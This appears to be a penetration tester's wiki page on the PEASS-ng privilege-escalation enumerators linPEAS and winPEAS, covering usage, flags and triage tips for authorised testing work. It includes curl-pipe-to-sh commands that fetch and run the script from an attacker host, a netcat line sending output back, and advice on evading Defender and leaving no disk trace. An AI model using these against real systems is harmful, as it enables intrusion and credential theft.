---
title: "PEASS-ng (linPEAS / winPEAS)"
type: tool
tags: [privilege-escalation, enumeration, post-exploitation, linux, windows, credentials]
date_created: 2026-07-02
date_updated: 2026-07-02
sources: []
phase: postex
---

# PEASS-ng (linPEAS / winPEAS)

## Purpose

PEASS-ng (Privilege Escalation Awesome Scripts Suite, next generation) is the standard post-exploitation privesc enumerator. `linpeas.sh` (Linux/macOS) and `winPEAS` (Windows) run hundreds of local checks (SUID/sudo, writable paths, cron, kernel version, cloud metadata, cached credentials, unquoted service paths, AutoRun keys, stored browser/DPAPI secrets) and color-code the output by likelihood so the operator jumps straight to the highest-probability escalation vector instead of reading a raw dump. It is a point-in-time snapshot; pair it with [[pspy]] to catch scheduled tasks and root cron jobs that a single run cannot see.

## Installation

Both scripts are shipped as release artifacts; nothing is installed on the target, you transfer and run.

```bash
# Pull the whole suite locally to stage from your attacker box
git clone https://github.com/peass-ng/PEASS-ng
# linPEAS lives at linPEAS/linpeas.sh; winPEAS binaries are on the releases page
```

Grab prebuilt artifacts (linpeas.sh, winPEASx64.exe, winPEASx86.exe, winPEASany.exe, obfuscated builds, winPEAS.bat) from: `https://github.com/peass-ng/PEASS-ng/releases/latest`

winPEAS variants:

| Artifact | Use case |
|---|---|
| `winPEASx64.exe` | 64-bit .NET build (most common) |
| `winPEASx86.exe` | 32-bit .NET build |
| `winPEASany.exe` | Architecture-agnostic .NET build (picks arch at runtime) |
| `winPEASany_ofs.exe` | Obfuscated build to reduce Defender/AV detection |
| `winPEAS.bat` | Pure batch fallback for hosts without the .NET runtime |

---

## Core usage

### linpeas.sh (Linux / macOS)

```bash
# Standard run (fast, sensible defaults)
./linpeas.sh

# Run every check, including the slow ones (1-min process watch, password
# search across the FS, top2000 user brute-force). Save the full log:
./linpeas.sh -a | tee linpeas.out

# Only run selected check groups (comma-separated, no spaces)
./linpeas.sh -o system_information,users_information,interesting_files

# Provide the current user's password so sudo -l and user brute checks work
./linpeas.sh -P 'CurrentUserPassw0rd'

# Quiet, no colors, no banner (clean text for a report or a dumb terminal)
./linpeas.sh -q -N
```

Key linPEAS flags:

| Flag | Purpose |
|---|---|
| `-a` | All checks (adds process monitoring, FS password search, user brute) |
| `-s` | Stealth and faster (skips the time-consuming checks) |
| `-e` | Extra enumeration (checks skipped by default) |
| `-r` | Regex scan for API keys/secrets across the filesystem |
| `-o` | Only run the listed check groups (see below) |
| `-P` | Supply a password for `sudo -l` and brute-force checks |
| `-N` | No colors |
| `-q` | No banner |
| `-w` | Wait (pause) between check blocks |
| `-L` / `-M` | Force Linux / macOS execution |
| `-h` | Help |

`-o` check groups: `system_information`, `container`, `cloud`, `procs_crons_timers_srvcs_sockets`, `network_information`, `users_information`, `software_information`, `interesting_files`, `api_keys_regex`.

### linPEAS delivery (curl-pipe-to-sh)

When you have a shell but do not want to drop a file on disk, stream the script straight into `sh`:

```bash
# Straight from the internet (target has egress)
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# From your attacker webserver on the engagement network
curl 10.10.14.20:8000/linpeas.sh | sh

# Pass flags through a piped run (note the '-s --' separator so sh forwards args)
curl 10.10.14.20:8000/linpeas.sh | sh -s -- -a
```

Serve it from the attacker side with `python3 -m http.server 8000` in the directory holding `linpeas.sh`.

### linPEAS offline / air-gapped transfer + output capture

When the target has no egress or you want the full log back on your box:

```bash
# On attacker: listen for the piped output
nc -lvnp 9002 | tee linpeas.out

# On victim: run linpeas and ship stdout back over nc (no file left on disk)
curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002
```

If you must write to disk, stage in a memory-backed, world-writable dir:

```bash
wget 10.10.14.20:8000/linpeas.sh -O /dev/shm/lp.sh && chmod +x /dev/shm/lp.sh && /dev/shm/lp.sh -a | tee /dev/shm/lp.out
```

### linPEAS color / severity legend

linPEAS colors findings by how likely they are to be a real escalation path. Read the loudest colors first:

| Color | Meaning |
|---|---|
| Red on Yellow (highlighted) | 99% a privilege-escalation vector; check it first |
| Red | Suspicious configuration that could lead to privesc |
| Green | Known-good configuration (matched on name, not verified content) |
| Blue | Users without a shell and mounted devices |
| Light cyan | Users with a shell |
| Light magenta | The current username |

The red-on-yellow highlight is the one to chase; everything else is context.

### winPEAS (Windows)

```powershell
# Full default run
.\winPEASx64.exe

# Architecture-agnostic build
.\winPEASany.exe

# Quiet, no colors (useful when redirecting to a file or over a plain shell)
.\winPEASx64.exe quiet notcolor > winpeas.txt

# Only the modules you care about (space-separated tokens)
.\winPEASx64.exe systeminfo userinfo servicesinfo windowscreds

# Fast run, skip the slow filesystem searches
.\winPEASx64.exe quiet fast

# Wait for a keypress between sections (interactive review)
.\winPEASx64.exe wait

# Batch fallback when .NET is unavailable
.\winPEAS.bat
```

winPEAS arguments and module tokens:

| Token | Purpose |
|---|---|
| `quiet` | Suppress the banner |
| `notcolor` | Disable ANSI colors (for redirected/plain output) |
| `wait` | Pause between check sections |
| `debug` | Verbose/debug output |
| `log` | Write output to a log file |
| `domain` | Run domain (LDAP) enumeration checks |
| `fast` | Skip slow filesystem/search-heavy checks |
| `cmd` | Run only checks that shell out to cmd (skip heavy .NET/WMI ones) |
| `systeminfo` `userinfo` `processinfo` `servicesinfo` `applicationsinfo` `networkinfo` `windowscreds` `browserinfo` `filesinfo` `eventsinfo` `fileanalysis` | Run only that module (combine several) |
| `-lolbas` | Enumerate LOLBAS binaries present on the host |
| `-vulnpackages` | Check installed packages against known-vulnerable versions |
| `-h` | Help |

winPEAS uses the same idea as linPEAS: bright/highlighted findings are the high-probability vectors. Run with `notcolor` when redirecting to a file, since raw ANSI escape codes clutter a saved log.

---

## Common use cases

- **First move after any foothold.** Run linPEAS (`-a` when time allows) or winPEAS immediately after landing a shell, before hand-enumeration. It surfaces the obvious wins (writable SUID, `sudo` NOPASSWD, unquoted service path, AlwaysInstallElevated) in seconds. Cross-reference hits against [[linux-privesc]] or [[windows-privilege-escalation]] for the exploitation steps.

- **Linux privesc triage.** The red-on-yellow lines map directly to techniques in [[linux-privesc]]: writable `/etc/passwd`, SUID `pkexec`/`find`/`nmap`, misconfigured `sudo`, capabilities, writable cron scripts, Docker socket. Confirm the vector, then exploit.

- **Windows privesc triage.** winPEAS `servicesinfo` (unquoted paths, weak service ACLs, modifiable binaries), `windowscreds` (cached creds, DPAPI, unattend/GPP passwords, saved RDP/WiFi keys), and registry AutoRun/AlwaysInstallElevated findings map to [[windows-privilege-escalation]].

- **Credential harvesting.** linPEAS `-r`/`-a` greps the filesystem for API keys and passwords; winPEAS `windowscreds` and `browserinfo` pull stored browser creds, DPAPI blobs, and config secrets. Feed anything found back into lateral movement.

- **Pair with pspy for scheduled tasks.** PEAS is a snapshot: it lists cron entries but cannot show a root job firing on a wildcard path or a writable script executed on a timer. Run [[pspy]] alongside linPEAS to catch those time-based vectors that a single enumeration pass misses.

## Tips and gotchas

- **PEAS is a lead generator, not proof.** Green means "matched a known-good name", not "verified safe", and a red-on-yellow line still needs you to confirm the vector manually. Do not report a finding straight from PEAS output; reproduce the escalation first.

- **Run with `-a` (linPEAS) when you can.** The default run skips the slow checks (FS-wide password search, process monitoring, user brute). On a box where noise/time is not a concern, `-a` finds things the default misses. Use `-s` (stealth) when you need to be fast and quiet instead.

- **`quiet notcolor` for clean logs.** Raw ANSI color codes make a redirected file unreadable. Add `notcolor` (winPEAS) or `-N` (linPEAS) whenever you pipe output to a file or a dumb shell, and `quiet`/`-q` to drop the banner.

- **Defender eats unobfuscated winPEAS.** The stock `winPEASx64.exe` is flagged and deleted by Windows Defender on write. Use the obfuscated `winPEASany_ofs.exe` build, run from memory, or exclude the staging folder. Assume the plain .exe will not survive on a defended host; `winPEAS.bat` is the low-footprint fallback (no .NET, less capable).

- **`/dev/shm` and `noexec`.** Stage linPEAS in `/dev/shm` (memory-backed, no disk trace) or `/tmp`. If either is mounted `noexec`, run it without touching disk via the curl-pipe-to-sh pattern (`curl ... | sh`).

- **Run it in memory when disk writes are risky.** For linPEAS, `curl ... | sh` never lands a file. For winPEAS, load and execute the assembly in memory (e.g. via a C2 `execute-assembly`) to avoid the on-disk AV hit.

- **Clock/locale noise.** PEAS output can be long; capture it with `tee` and grep the saved log (`grep -iE '95%|special|writable|nopasswd'`) rather than scrolling a live terminal.

- **Match the architecture.** Use `winPEASx64.exe` on 64-bit, `winPEASx86.exe` on 32-bit, or `winPEASany.exe` if unsure. A wrong-arch build fails silently or errors.

## Related

- [[linux-privesc]]: exploitation steps for the vectors linPEAS surfaces
- [[windows-privilege-escalation]]: exploitation steps for the vectors winPEAS surfaces
- [[pspy]]: process/cron monitoring to catch scheduled-task vectors PEAS cannot

## Sources

- PEASS-ng GitHub: https://github.com/peass-ng/PEASS-ng
